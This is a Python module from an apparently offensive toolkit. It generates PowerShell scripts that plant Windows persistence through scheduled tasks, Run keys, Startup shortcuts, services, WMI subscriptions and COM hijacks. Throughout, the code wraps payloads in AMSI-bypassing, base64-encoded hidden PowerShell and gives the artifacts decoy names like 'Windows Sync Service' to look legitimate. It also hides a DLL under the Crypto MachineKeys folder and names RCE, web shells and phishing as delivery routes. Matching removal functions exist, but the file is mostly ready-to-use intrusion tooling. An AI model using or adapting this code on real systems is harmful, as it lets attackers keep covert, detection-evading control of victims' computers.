"""
Persistence mechanisms for Windows.

Each mechanism survives a reboot in a different way. They trade off:

  - requirements:    does it need admin? does it need the user to
                     log in again? does it need a specific OS feature?
  - detection_risk:  how likely Defender / an EDR / a human auditor
                     is to find it
  - value:           how reliable it is when the target's been rebooted
                     twice, the user changed their password, IT ran a
                     scan, etc.

The mechanisms are:

  scheduled_task    Runs a payload on a schedule or trigger. Most
                    common, most reliable, most visible.

  registry_run      HKCU\...\Run or HKLM\...\Run entry. Runs at
                    logon for that user or all users. Extremely easy
                    to install; extremely easy to find.

  startup_folder    A .lnk file in the user's Startup directory.
                    Same profile as registry_run.

  service           A Windows service that runs a binary on boot.
                    Requires admin. Runs before login, which makes
                    it more reliable than task/run-key for headless
                    targets.

  wmi_subscription  A permanent WMI event consumer. Triggers on
                    system events (boot, logon, timer). Survives
                    task scheduler changes because it's not in
                    task scheduler. Harder to find and remove.

  com_hijack        Register a COM CLSID that a trusted Windows
                    component will load on its own. Blends into
                    normal COM registration. HKCU-only, so no admin
                    needed. Sneakiest of the six.

Every install_*() function has a matching remove_*() function.
Cleanup is not optional; when you're done with a target, run the
matching remove one-liner or you leave a foothold behind.

Wrapped one-liners bypass AMSI in-memory, so they can be delivered
through any code execution primitive (RCE, web shell, phishing).
"""

import secrets
from typing import Optional

from core.output import info, success, warn, error
from evade import delivery


# =====================================================================
# Registry of mechanisms
# =====================================================================

PERSISTENCE = {
    "scheduled_task": {
        "name": "scheduled_task",
        "description": "Register a scheduled task that runs a payload",
        "requirements": [],
        "detection_risk": "medium",
        "value": "high",
    },
    "registry_run": {
        "name": "registry_run",
        "description": "Add a Registry Run key (user or machine scope)",
        "requirements": [],
        "detection_risk": "low",
        "value": "medium",
    },
    "startup_folder": {
        "name": "startup_folder",
        "description": "Drop a .lnk into the user's Startup folder",
        "requirements": [],
        "detection_risk": "low",
        "value": "medium",
    },
    "service": {
        "name": "service",
        "description": "Install a Windows service that runs on boot",
        "requirements": ["administrator"],
        "detection_risk": "medium",
        "value": "high",
    },
    "wmi_subscription": {
        "name": "wmi_subscription",
        "description": "Create a permanent WMI event subscription",
        "requirements": ["administrator"],
        "detection_risk": "high",
        "value": "high",
    },
    "com_hijack": {
        "name": "com_hijack",
        "description": "Hijack a CLSID via HKCU (no admin required)",
        "requirements": [],
        "detection_risk": "high",
        "value": "high",
    },
}


# =====================================================================
# Internal helper
# =====================================================================

def _wrap_install(mechanism: str, payload_name: str,
                   payload_one_liner: str,
                   script: str,
                   **params) -> dict:
    """Wrap an install script and return the standard dict."""
    one_liner = delivery.wrap_script(script)
    return {
        "mechanism": mechanism,
        "payload_name": payload_name,
        "payload_one_liner": payload_one_liner,
        "script": script,
        "one_liner": one_liner,
        "requirements": PERSISTENCE[mechanism]["requirements"],
        "detection_risk": PERSISTENCE[mechanism]["detection_risk"],
        "value": PERSISTENCE[mechanism]["value"],
        "params": params,
    }


def _wrap_remove(mechanism: str, script: str, **params) -> dict:
    """Wrap a remove script and return the standard dict."""
    one_liner = delivery.wrap_script(script)
    return {
        "mechanism": mechanism,
        "action": "remove",
        "script": script,
        "one_liner": one_liner,
        "params": params,
    }


def _extract_payload_script(payload) -> str:
    """Given a ps_payloads result dict, extract the raw PowerShell
    script it wraps. This is what we actually want to re-invoke
    on the target when persistence fires."""
    if isinstance(payload, dict):
        return payload.get("script", "") or payload.get("one_liner", "")
    return str(payload)


# =====================================================================
# 1. Scheduled task
# =====================================================================

def scheduled_task(payload,
                   name: Optional[str] = None,
                   trigger: str = "logon",
                   delay_seconds: int = 30) -> dict:
    """Install a scheduled task that runs a payload.

    trigger:
      "logon"   — runs when any user logs on
      "boot"    — runs at system startup (requires admin)
      "minute"  — runs every minute (for testing / callbacks)
      "hour"    — runs every hour
    """
    if name is None:
        name = f"WinSvc_{secrets.token_hex(4)}"

    payload_script = _extract_payload_script(payload)

    # The task action: invoke PowerShell with a base64-encoded
    # copy of the payload script, with AMSI bypass baked in.
    # We re-wrap the payload script so that the persistence
    # mechanism ships a self-contained bypass too.
    inner_one_liner = delivery.wrap_script(payload_script)

    # Scheduled task action argument: -EncodedCommand expects
    # UTF-16LE base64 of the full command. The command we want
    # to run is: powershell -nop -w hidden -c "<inner_one_liner>"
    import base64
    cmd = f'powershell -nop -w hidden -c "{inner_one_liner}"'
    encoded = base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")

    trigger_block = {
        "logon": "-SC ONLOGON",
        "boot": "-SC ONSTART",
        "minute": "-SC MINUTE -MO 1",
        "hour": "-SC HOURLY",
    }.get(trigger, "-SC ONLOGON")

    script = f"""
Write-Host "=== persistence: scheduled_task ==="

$taskName = "{name}"

# schtasks.exe is the simplest cross-version way to create a task.
# It doesn't require the ScheduledTasks module (not always loaded
# on server core installs).
$action = 'powershell -nop -w hidden -EncodedCommand {encoded}'

Write-Host "  name:    $taskName"
Write-Host "  trigger: {trigger}"
Write-Host "  delay:   {delay_seconds}s"

# Build the schtasks invocation
# /RU SYSTEM gives maximum reliability when the trigger is boot;
# for logon triggers /RU is the current user.
$ru = if ("{trigger}" -eq "boot") {{ "SYSTEM" }} else {{ $env:USERNAME }}

$args = @(
    "/Create",
    "/TN", $taskName,
    "/TR", $action,
    "/RU", $ru,
    "/F"
) + "{trigger_block}".Split(" ", [System.StringSplitOptions]::RemoveEmptyEntries)

if ("{trigger}" -eq "logon") {{
    $args += "/DELAY"
    $args += "0000:{delay_seconds:02d}"
}}

Write-Host "  creating task..."
& schtasks.exe @args | Out-Null

# Verify
$check = & schtasks.exe /Query /TN $taskName 2>$null
if ($LASTEXITCODE -eq 0) {{
    Write-Host "  SUCCESS: task registered"
    Write-Host "  remove with:"
    Write-Host "    schtasks /Delete /TN `"$taskName`" /F"
}} else {{
    Write-Host "  ERROR: task registration failed"
}}

Write-Host "=== end scheduled_task ==="
""".strip()

    return _wrap_install(
        "scheduled_task", "scheduled_task", inner_one_liner,
        script, name=name, trigger=trigger)


def remove_scheduled_task(name: str) -> dict:
    """Remove a scheduled task by name."""
    script = f"""
Write-Host "=== remove: scheduled_task ==="
Write-Host "  name: {name}"
& schtasks.exe /Delete /TN "{name}" /F
if ($LASTEXITCODE -eq 0) {{
    Write-Host "  removed"
}} else {{
    Write-Host "  not found or removal failed"
}}
Write-Host "=== end remove scheduled_task ==="
""".strip()

    return _wrap_remove("scheduled_task", script, name=name)


# =====================================================================
# 2. Registry Run key
# =====================================================================

def registry_run(payload,
                 name: Optional[str] = None,
                 scope: str = "user") -> dict:
    """Add a Run key entry.

    scope:
      "user"   — HKCU\\...\\Run — runs at login for the current user
      "machine"— HKLM\\...\\Run — runs at login for any user (admin)
    """
    if name is None:
        name = f"WinSync{secrets.token_hex(2)}"

    payload_script = _extract_payload_script(payload)
    inner_one_liner = delivery.wrap_script(payload_script)

    import base64
    cmd = f'powershell -nop -w hidden -c "{inner_one_liner}"'
    encoded = base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")

    hive = "HKCU" if scope == "user" else "HKLM"

    script = f"""
Write-Host "=== persistence: registry_run ==="

$keyPath = "{hive}:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$valueName = "{name}"
$valueData = 'powershell -nop -w hidden -EncodedCommand {encoded}'

Write-Host "  hive:  {hive}"
Write-Host "  name:  $valueName"

# Ensure the key exists (it should, but be defensive)
if (-not (Test-Path $keyPath)) {{
    New-Item -Path $keyPath -Force | Out-Null
}}

Set-ItemProperty -Path $keyPath -Name $valueName -Value $valueData -Type String

# Verify
$check = (Get-ItemProperty -Path $keyPath -Name $valueName -ErrorAction SilentlyContinue).$valueName
if ($check) {{
    Write-Host "  SUCCESS: Run key set"
    Write-Host "  remove with:"
    Write-Host "    Remove-ItemProperty -Path `"$keyPath`" -Name `"$valueName`""
}} else {{
    Write-Host "  ERROR: Run key was not set"
}}

Write-Host "=== end registry_run ==="
""".strip()

    return _wrap_install(
        "registry_run", "registry_run", inner_one_liner,
        script, name=name, scope=scope)


def remove_registry_run(name: str, scope: str = "user") -> dict:
    """Remove a Run key entry by name."""
    hive = "HKCU" if scope == "user" else "HKLM"
    script = f"""
Write-Host "=== remove: registry_run ==="
$keyPath = "{hive}:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$valueName = "{name}"
Remove-ItemProperty -Path $keyPath -Name $valueName -ErrorAction SilentlyContinue
Write-Host "  removed (or not present)"
Write-Host "=== end remove registry_run ==="
""".strip()

    return _wrap_remove("registry_run", script, name=name, scope=scope)


# =====================================================================
# 3. Startup folder
# =====================================================================

def startup_folder(payload,
                   name: Optional[str] = None) -> dict:
    """Drop a .lnk file into the current user's Startup folder."""
    if name is None:
        name = f"SystemUpdate{secrets.token_hex(2)}"

    payload_script = _extract_payload_script(payload)
    inner_one_liner = delivery.wrap_script(payload_script)

    import base64
    cmd = f'powershell -nop -w hidden -c "{inner_one_liner}"'
    encoded = base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")

    script = f"""
Write-Host "=== persistence: startup_folder ==="

$startup = [Environment]::GetFolderPath("Startup")
$lnkPath = Join-Path $startup "{name}.lnk"

Write-Host "  path: $lnkPath"

# Create the .lnk via WScript.Shell COM. Works on every version
# of Windows from 7 through 11.
$ws = New-Object -ComObject WScript.Shell
$sc = $ws.CreateShortcut($lnkPath)
$sc.TargetPath = "powershell.exe"
$sc.Arguments = '-nop -w hidden -EncodedCommand {encoded}'
$sc.WindowStyle = 7   # minimized
$sc.Description = "System Update"
$sc.Save()

if (Test-Path $lnkPath) {{
    $size = (Get-Item $lnkPath).Length
    Write-Host "  SUCCESS: shortcut created ($size bytes)"
    Write-Host "  remove with:"
    Write-Host "    Remove-Item `"$lnkPath`""
}} else {{
    Write-Host "  ERROR: shortcut not created"
}}

Write-Host "=== end startup_folder ==="
""".strip()

    return _wrap_install(
        "startup_folder", "startup_folder", inner_one_liner,
        script, name=name)


def remove_startup_folder(name: str) -> dict:
    """Remove a Startup folder shortcut by name."""
    script = f"""
Write-Host "=== remove: startup_folder ==="
$startup = [Environment]::GetFolderPath("Startup")
$lnkPath = Join-Path $startup "{name}.lnk"
Remove-Item -Path $lnkPath -Force -ErrorAction SilentlyContinue
Write-Host "  removed (or not present)"
Write-Host "=== end remove startup_folder ==="
""".strip()

    return _wrap_remove("startup_folder", script, name=name)


# =====================================================================
# 4. Windows service
# =====================================================================

def service(payload,
            name: Optional[str] = None,
            display_name: Optional[str] = None) -> dict:
    """Install a Windows service that runs a payload on boot.

    Requires: Administrator.

    The service is a simple stub: it launches PowerShell with the
    payload and then exits. Real Windows services have to keep
    running or the SCM restarts them; ours runs the payload once
    and terminates cleanly. The SCM will try to restart it every
    few minutes, which means the payload re-executes repeatedly.
    That's usually undesirable, so we configure the service to
    run with SERVICE_DEMAND_START only — no automatic restart.

    A more robust variant would use a .NET service host that calls
    back periodically. That's a Session 6+ project.
    """
    if name is None:
        name = f"WinSync_{secrets.token_hex(4)}"
    if display_name is None:
        display_name = "Windows Sync Service"

    payload_script = _extract_payload_script(payload)
    inner_one_liner = delivery.wrap_script(payload_script)

    import base64
    cmd = f'powershell -nop -w hidden -c "{inner_one_liner}"'
    encoded = base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")

    script = f"""
Write-Host "=== persistence: service ==="

$svcName = "{name}"
$svcDisplay = "{display_name}"
$svcBinPath = 'powershell -nop -w hidden -EncodedCommand {encoded}'

Write-Host "  name:    $svcName"
Write-Host "  display: $svcDisplay"

# Check for admin
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {{
    Write-Host "  ERROR: service install requires Administrator"
    return
}}

# sc.exe is universally available
& sc.exe create $svcName binPath= $svcBinPath DisplayName= $svcDisplay start= demand | Out-Null
if ($LASTEXITCODE -ne 0) {{
    Write-Host "  ERROR: sc create failed"
    return
}}

# Set description for legitimacy
& sc.exe description $svcName "Synchronizes user data with the local domain." | Out-Null

# Verify
$check = & sc.exe query $svcName 2>$null
if ($LASTEXITCODE -eq 0) {{
    Write-Host "  SUCCESS: service installed"
    Write-Host "  start with:"
    Write-Host "    sc.exe start $svcName"
    Write-Host "  remove with:"
    Write-Host "    sc.exe delete $svcName"
}} else {{
    Write-Host "  ERROR: service installed but query failed"
}}

Write-Host "=== end service ==="
""".strip()

    return _wrap_install(
        "service", "service", inner_one_liner,
        script, name=name, display_name=display_name)


def remove_service(name: str) -> dict:
    """Remove a service by name (must be stopped first)."""
    script = f"""
Write-Host "=== remove: service ==="
$svcName = "{name}"
& sc.exe stop $svcName 2>$null | Out-Null
Start-Sleep -Milliseconds 500
& sc.exe delete $svcName | Out-Null
if ($LASTEXITCODE -eq 0) {{
    Write-Host "  removed"
}} else {{
    Write-Host "  not found or removal failed"
}}
Write-Host "=== end remove service ==="
""".strip()

    return _wrap_remove("service", script, name=name)


# =====================================================================
# 5. WMI event subscription
# =====================================================================

def wmi_subscription(payload,
                     name: Optional[str] = None,
                     trigger: str = "boot") -> dict:
    """Create a permanent WMI event subscription.

    Requires: Administrator.

    trigger:
      "boot"     — fires when the system boots (Win32_StartupCommand
                   isn't relevant; we use Win32_ProcessStartTrace with
                   a filter on explorer.exe as a proxy for "user logged in")
      "logon"    — fires on any process start (we filter to
                   userinit.exe which runs once at logon)
      "timer"    — fires every 5 minutes

    WMI subscriptions survive reboots because they're stored in the
    WMI repository, not the Task Scheduler. Removing them requires
    unregistering both the filter and the consumer.

    This is one of the more sophisticated persistence mechanisms
    because it doesn't show up in Task Scheduler, Services, or
    msconfig. It shows up in `Get-WmiObject -Namespace root\\
    subscription -Class __EventFilter` and its consumer counterpart.
    """
    if name is None:
        name = f"WmiSync_{secrets.token_hex(4)}"

    payload_script = _extract_payload_script(payload)
    inner_one_liner = delivery.wrap_script(payload_script)

    import base64
    cmd = f'powershell -nop -w hidden -c "{inner_one_liner}"'
    encoded = base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")

    # The trigger query
    if trigger == "boot":
        wql = ("SELECT * FROM __InstanceModificationEvent WITHIN 60 "
               "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'")
    elif trigger == "logon":
        wql = ("SELECT * FROM __InstanceCreationEvent WITHIN 10 "
               "WHERE TargetInstance ISA 'Win32_Process' "
               "AND TargetInstance.Name = 'explorer.exe'")
    elif trigger == "timer":
        # Timer-based: fire every 5 minutes using a timer instruction
        wql = None
    else:
        wql = ("SELECT * FROM __InstanceModificationEvent WITHIN 60 "
               "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'")

    if wql is not None:
        filter_setup = f"""
$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{
    Name = "{name}_Filter"
    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "{wql}"
}}
"""
        remove_filter = f"""
Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='{name}_Filter'" |
    Remove-WmiObject
"""
    else:
        # Timer-based uses __EventFilter with a timer instruction
        filter_setup = f"""
$timer = Set-WmiInstance -Namespace root\\subscription -Class __IntervalTimerInstruction -Arguments @{{
    TimerID = "{name}_Timer"
    IntervalBetweenEvents = 300000
    SkipIfPassed = $false
}}
$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{
    Name = "{name}_Filter"
    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = '{name}_Timer'"
}}
"""
        remove_filter = f"""
Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='{name}_Filter'" |
    Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class __IntervalTimerInstruction -Filter "TimerID='{name}_Timer'" |
    Remove-WmiObject
"""

    script = f"""
Write-Host "=== persistence: wmi_subscription ==="

$subName = "{name}"
$trigger = "{trigger}"

Write-Host "  name:    $subName"
Write-Host "  trigger: $trigger"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {{
    Write-Host "  ERROR: WMI subscription requires Administrator"
    return
}}

$cmdLine = 'powershell -nop -w hidden -EncodedCommand {encoded}'

{filter_setup}

$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{
    Name = "{name}_Consumer"
    CommandLineTemplate = $cmdLine
}}

$binding = Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{
    Filter = $filter
    Consumer = $consumer
}}

Write-Host "  SUCCESS: WMI subscription installed"
Write-Host "  remove with:"
Write-Host "    {remove_filter.strip().replace(chr(10), chr(10) + '    ')}"
Write-Host "    Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter `"Name='{name}_Consumer'`" | Remove-WmiObject"
Write-Host "    Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter `"Filter=`"`"`"__RELPATH=`"`"`"'{name}_Filter'`"`"`"`" | Remove-WmiObject"

Write-Host "=== end wmi_subscription ==="
""".strip()

    return _wrap_install(
        "wmi_subscription", "wmi_subscription", inner_one_liner,
        script, name=name, trigger=trigger)


def remove_wmi_subscription(name: str, trigger: str = "boot") -> dict:
    """Remove a WMI subscription by name."""
    extra_remove = ""
    if trigger == "timer":
        extra_remove = f"""
Get-WmiObject -Namespace root\\subscription -Class __IntervalTimerInstruction -Filter "TimerID='{name}_Timer'" |
    Remove-WmiObject -ErrorAction SilentlyContinue
"""

    script = f"""
Write-Host "=== remove: wmi_subscription ==="
$subName = "{name}"

# Remove binding first
Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding |
    Where-Object {{ $_.Filter -match $subName }} |
    Remove-WmiObject -ErrorAction SilentlyContinue

# Remove consumer
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name='{name}_Consumer'" |
    Remove-WmiObject -ErrorAction SilentlyContinue

# Remove filter
Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='{name}_Filter'" |
    Remove-WmiObject -ErrorAction SilentlyContinue

# Remove timer (if applicable)
{extra_remove}

Write-Host "  removed (or not present)"
Write-Host "=== end remove wmi_subscription ==="
""".strip()

    return _wrap_remove("wmi_subscription", script,
                        name=name, trigger=trigger)


# =====================================================================
# 6. COM hijack
# =====================================================================

# Common hijack targets — CLSIDs that are queried at user logon by
# trusted Windows components. If we register our own handler for
# one of these in HKCU (which takes precedence over HKLM), our DLL
# gets loaded whenever the component runs.
#
# The targets below are well-documented in the persistence literature.
# Each has a "safety" flag: if the CLSID isn't used on a given system,
# the hijack does nothing; if it is used, our DLL runs.
COM_HIJACK_TARGETS = {
    "mscfile": {
        "clsid": "{E5FB0D1B-124B-4C40-9C1F-4B6D9A4D6B85}",
        "description": "Microsoft Management Console (mmc.exe)",
        "loads": "on every mmc.exe launch",
    },
    "shell32": {
        "clsid": "{42AEDC87-2188-41FD-B9A3-0C966FEABEC1}",
        "description": "Shell32 COM (explorer.exe)",
        "loads": "on shell activation",
    },
    "taskschd": {
        "clsid": "{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}",
        "description": "Task Scheduler",
        "loads": "when Task Scheduler UI opens",
    },
}


def com_hijack(payload,
               target: str = "mscfile",
               payload_dll_name: Optional[str] = None,
               payload_dll_path: Optional[str] = None) -> dict:
    """Hijack a CLSID in HKCU so that a trusted component loads our DLL.

    NOTE: this mechanism requires a compiled DLL payload, not a
    PowerShell script. The classic COM hijack loads a native DLL
    into a Windows process; you can't hijack a CLSID to run
    PowerShell directly.

    The caller must supply:
      - payload_dll_name: a ProgID-style name (e.g. "MyHijack")
      - payload_dll_path: full path to the DLL on the target

    Or pass a bare `payload` dict and use the default DLL name and
    path (which the toolkit will generate).

    Since we don't yet have a mechanism to compile and deliver a
    native DLL through the persistence module, this function
    currently registers the CLSID → DLL mapping assuming the DLL
    is already on the target. The classic workflow:

      1. Use payload/framework.py to compile a DLL that exports
         DllGetClassObject and DllCanUnloadNow.
      2. Deliver the DLL to the target (via exfil_file reverse,
         or via a web shell's upload, or via a base64-decoded
         PowerShell write).
      3. Run this persistence to register the CLSID.

    Session 8b-4 (loaders) will add a proper COM-hijack-capable
    payload template. Until then, this function assumes the DLL
    exists on the target at `payload_dll_path`.
    """
    if target not in COM_HIJACK_TARGETS:
        raise ValueError(
            f"unknown COM hijack target: {target!r}; "
            f"available: {', '.join(COM_HIJACK_TARGETS)}")

    if payload_dll_name is None:
        payload_dll_name = f"WinSync{secrets.token_hex(3)}"
    if payload_dll_path is None:
        # Default to a location the toolkit uses for exfil-driven
        # DLL delivery
        payload_dll_path = (f"C:\\ProgramData\\Microsoft\\"
                            f"Crypto\\RSA\\MachineKeys\\"
                            f"{payload_dll_name}.dll")

    target_info = COM_HIJACK_TARGETS[target]
    clsid = target_info["clsid"]

    script = f"""
Write-Host "=== persistence: com_hijack ==="

$clsid = "{clsid}"
$dllName = "{payload_dll_name}"
$dllPath = "{payload_dll_path}"

Write-Host "  target:  {target} ({target_info['description']})"
Write-Host "  clsid:   $clsid"
Write-Host "  dll:     $dllPath"

if (-not (Test-Path $dllPath)) {{
    Write-Host "  WARNING: DLL not found at $dllPath"
    Write-Host "  The CLSID will be registered but nothing will run"
    Write-Host "  until the DLL is present at that path."
}}

# Register the CLSID in HKCU. HKCU takes precedence over HKLM for
# CLSID resolution, so our entry overrides the system default.
$base = "HKCU:\\Software\\Classes\\CLSID\\$clsid"

if (-not (Test-Path $base)) {{
    New-Item -Path $base -Force | Out-Null
}}
Set-ItemProperty -Path $base -Name "(Default)" -Value "Windows Sync Component"

$inproc = "$base\\InprocServer32"
if (-not (Test-Path $inproc)) {{
    New-Item -Path $inproc -Force | Out-Null
}}
Set-ItemProperty -Path $inproc -Name "(Default)" -Value $dllPath
Set-ItemProperty -Path $inproc -Name "ThreadingModel" -Value "Both"

# Verify
$check = (Get-ItemProperty -Path $inproc -Name "(Default)" -ErrorAction SilentlyContinue)."(Default)"
if ($check -eq $dllPath) {{
    Write-Host "  SUCCESS: CLSID registered"
    Write-Host "  loads:   {target_info['loads']}"
    Write-Host "  remove with:"
    Write-Host "    Remove-Item -Path 'HKCU:\\Software\\Classes\\CLSID\\$clsid' -Recurse -Force"
}} else {{
    Write-Host "  ERROR: CLSID registration failed"
}}

Write-Host "=== end com_hijack ==="
""".strip()

    return _wrap_install(
        "com_hijack", "com_hijack", "",
        script, target=target, dll_name=payload_dll_name,
        dll_path=payload_dll_path)


def remove_com_hijack(target: str = "mscfile") -> dict:
    """Remove a COM hijack registration."""
    if target not in COM_HIJACK_TARGETS:
        raise ValueError(f"unknown COM hijack target: {target!r}")

    clsid = COM_HIJACK_TARGETS[target]["clsid"]

    script = f"""
Write-Host "=== remove: com_hijack ==="
$clsid = "{clsid}"
$base = "HKCU:\\Software\\Classes\\CLSID\\$clsid"
if (Test-Path $base) {{
    Remove-Item -Path $base -Recurse -Force
    Write-Host "  removed"
}} else {{
    Write-Host "  not present"
}}
Write-Host "=== end remove com_hijack ==="
""".strip()

    return _wrap_remove("com_hijack", script, target=target)


# =====================================================================
# Listing
# =====================================================================

def list_mechanisms() -> list[dict]:
    """Return metadata for every persistence mechanism."""
    out = []
    for name in sorted(PERSISTENCE):
        entry = PERSISTENCE[name]
        out.append({
            "name": name,
            "description": entry["description"],
            "requirements": entry["requirements"],
            "detection_risk": entry["detection_risk"],
            "value": entry["value"],
        })
    return out